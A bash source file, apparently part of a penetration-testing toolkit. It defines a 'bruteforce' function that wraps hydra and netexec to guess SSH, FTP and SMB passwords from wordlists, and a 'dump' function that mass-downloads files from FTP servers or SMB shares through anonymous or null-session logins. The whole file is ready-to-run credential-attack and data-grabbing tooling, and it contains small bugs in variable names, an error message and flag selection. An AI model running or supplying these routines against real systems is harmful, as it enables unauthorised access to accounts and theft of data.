#!/bin/bash


# Description:
#   Bruteforce services with predefined arguments.
#   By default, it loads the username.txt and password.txt on the current directory.
# Usage: bruteforce [-h, --help] <-i, --ip IP> <-s, --service SERVICE> [OPTIONS]
# Arguments:
#   - IP: target IPv4 address
#   - SERVICE: current support with: ssh, ftp, smb
#   - OPTIONS:
#       + [-u, --username string|file]: used username (or wordlist)
#       + [-p, --password string|file]: used password (or wordlist)
#       + [-P, --port port]: used port
# Example: 
#   bruteforce -s ssh -i $target
#   bruteforce -s smb -i $target
#   bruteforce -s ftp -i $target -p password.txt
function bruteforce() {
    [[ $# -eq 0 || $1 == "-h" || $1 == "--help" ]] && _help && return 0

    local IP
    local service
    local port
    local used_username="$PWD/username.txt"
    local used_password="$PWD/password.txt"

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -i|--ip) IP="$2" && shift 2 ;;
            -s|--service) service="$2" && shift 2 ;;
            -P|--port) port="$2" && shift 2 ;;
            -u|--username) used_username="$2" && shift 2 ;;
            -p|--password) used_password="$2" && shift 2 ;;
            *) _help && return 0 ;;
        esac
    done

    [[ ! -f "$used_username" && ! -n "$used_username" ]] && swiss_logger error "[e] type of username incorrect. Required: string, files" && return 1
    [[ ! -f "$used_password" && ! -n "$used_password" ]] && swiss_logger error "[e] type of password incorrect. Required: string, files" && return 1

    case $service in
        ftp|ssh)
            if [[ "$service" == "ftp" ]]; then
                used_port="${port:-21}"
            elif [[ "$service" == "ssh" ]]; then
                used_port="${port:-22}"
            fi

            local username_fmt
            [[ -z "$used_username" ]] && swiss_logger error "[e] username is not set." && return 1
            [[ -n "$used_username" ]] && username_fmt="-l" || [[ -f "$used_username" ]] && username_fmt="-L"
            
            local password_fmt
            [[ -z "$used_password" ]] && swiss_logger error "[e] username is not set." && return 1
            [[ -n "$used_password" ]] && password_fmt="-p" || [[ -f "$used_password" ]] && password_fmt="-P"

            swiss_logger info "[i] bruteforce $service. Run -e nsr with $used_username"
            _wrap hydra $username_fmt $used_username -e nsr -s $used_port $service://$IP
            
            swiss_logger info "[i] Run $used_username with $used_password"
            _wrap hydra $username_fmt $used_username $password_fmt $used_password -s $used_port $service://$IP
            ;;
        smb)
            swiss_logger info "[i] --local-auth"
            _wrap nxc smb $IP -u $used_username -p $used_password --local-auth

            swiss_logger info "[i] DC auth"
            _wrap nxc smb $IP -u $used_username -p $used_password
            ;;
    esac
}

# Description: dump files from FTP or SMB service
# Usage: dump <-s, --service SERVICE> <-i, --ip IP> [OPTIONS]
# Arguments:
#   - SERVICE: ftp, smb
#   - IP: IP address of the target machine
#   - OPTIONS:
#       + [-u, --username USERNAME]: used username. (ftp default = 'anonymous', smb default = '')
#       + [-p, --password PASSWORD]: used password. (ftp default = 'anonymous', smb default = '')
#       + [-s, --share SHARES]: (SMB) shares used.
# Example:
#   dump -s ftp -i $target
#   dump -s smb -i $target --share share -u dexter -p dexter
function dump() {
    [[ $# -eq 0 || $1 == "-h" || $1 == "--help" ]] && _help && return 0

    local IP
    local service
    local port
    local options_username
    local option_password
    local options_share

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -i|--ip) IP="$2" && shift 2 ;;
            -s|--service) service="$2" && shift 2 ;;
            -P|--port) port="$2" && shift 2 ;;
            -u|--username) options_username="$2" && shift 2 ;;
            -p|--password) options_password="$2" && shift 2 ;;
            -S|--share) options_share="$2" && shift 2 ;;
            *) _help && return 0 ;;
        esac
    done

    case "$service" in
        ftp)
            swiss_logger info "[i] Dumping files from FTP server"
            local username="${options_username:-anonymous}"
            local password="${options_password:-anonymous}"
            _wrap wget -r --no-passive --no-parent ftp://$username:$password@$IP
            ;;
        smb)
            swiss_logger info "[i] dump from SMB"
            # TODO: impl username and password access
            local username="${options_username:-}"
            local password="${options_password:-}"
            [[ -z "$options_share" ]] && swiss_logger error "[e] Shares must be specified. Use -S, --share." && return 1
            _wrap smbclient //$IP/$options_share -N -c 'prompt OFF;recurse ON;cd; lcd '$PWD';mget *'
            ;;
        *) swiss_logger error "[e] Invalid service '$service'. Valid service: ftp, smb" && return 1 ;;
    esac
}